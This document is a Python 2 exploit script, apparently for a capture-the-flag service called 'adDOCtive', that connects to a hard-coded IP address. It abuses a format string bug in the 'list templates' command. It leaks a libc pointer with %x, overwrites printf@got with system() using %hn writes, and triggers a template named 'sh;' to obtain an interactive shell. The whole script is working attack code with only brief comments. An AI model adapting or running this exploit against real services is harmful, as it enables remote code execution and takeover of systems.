#!/usr/bin/env python

import sys
import socket
import struct
import telnetlib
import time
import re
import string
import random

banner = """
            ############################################################
            ####                                                    ####
            #### adDOCtive - 'list templates' format string exploit ####
            ####                                                    ####
            ############################################################
        """


s = socket.create_connection(("52.28.35.47", 1234))
#s = socket.create_connection(("127.0.0.1", 13337))


def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def ra(to=.5):
    buf = ""
    s.setblocking(0)
    begin = time.time()
    while 1:
        if buf is not "" and time.time() - begin > to:
            break
        elif time.time() - begin > to*2:
            break
        try:
            data = s.recv(4096)
            if data:
                begin = time.time()
                buf += data
            else:
                time.sleep(.1)
        except:
            pass

    s.setblocking(1)
    return buf


def rt(delim):
    buf = ""
    while delim not in buf:
        buf += s.recv(1)
    return buf


def se(data):
    s.sendall(data)

def u32(d):
    return struct.unpack("<I", d)[0]

def u64(d):
    return struct.unpack("<Q",d)[0]


def p32(d):
    return struct.pack("<I", d)


def p64(d):
    return struct.pack("<Q", d)

def rstr(l):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(l))

def register(user, passwd):
    se("1\n")
    se(user + "\n")
    se(passwd + "\n")

def login(user, passwd):
    se("2\n")
    se(user + "\n")
    se(passwd + "\n")

def create_template(name, content):
    se("4\n")
    se(name  + "\n")
    se(content + "\nEOF\n")

def instantiate_template(name, a, b, c):
    se("5\n")
    se(name + "\n")
    se(a + "\n")
    se(b + "\n")
    se(c + "\n")

def list_templates():
    se("2\n")

def logout():
    se("0\n")



def pwn():
    print banner

    stackoffset_libc_ret_main = 1083        # offset of return address of main() to libc on the stack
    offset_system = 0x2626d
    printf_got = 0x804C018


    # generate random username/password
    username = p32(printf_got) + p32(printf_got + 2) + rstr(10)         # we need printf@got on the stack
    password = rstr(10)


    # register new user
    print "[+] register new user"
    register(username, password)

    # login
    print "[+] logging in"
    login(username, password)


    ########## First leak a libc pointer to calculate address of system() ###############
    print "[+] leaking libc pointer"


    tmpl_name = "sh;\"%" + str(stackoffset_libc_ret_main) + "$x\""          # sh; will be used later
    create_template(tmpl_name, "")
    list_templates()

    libc_ret_main = int(re.search("\"([^\"]*)", ra(to=2)).group(1), 16)
    print "[+] ret main @ " + hex(libc_ret_main)

    system_libc = libc_ret_main + offset_system
    print "[+] system @ " + hex(system_libc)


    ########## Now we will overwrite printf@got with system@libc #################
    #   Since printf() is called in a loop, we can simply manage to pass /bin/sh
    #   as argument to it, by just creating  template with name sh


    # the lower/higher byte values for %n of system@libc
    lower_out = (system_libc  & 0xffff) 
    higher_out = (system_libc >> 16) - lower_out 


    # first template to write system at printf@got
    create_template(
            "%" + str(lower_out) + "c%10$hn" +               # overwrite the lower bytes of puts@got
            "%" + str(higher_out) + "c%11$hn",                # overwrite the higher bytes of puts@got
            "")



    list_templates()

    # depending on the order of files returned by readdir() the shell might not have
    # spawned on the first list_template() call (_--> the template with the "sh" in its name
    # was printed before the format string template)
    if "How can we help you today?" in ra():
        list_templates()

    print "[+] Your shell: "
    ra()
    interact()

pwn()

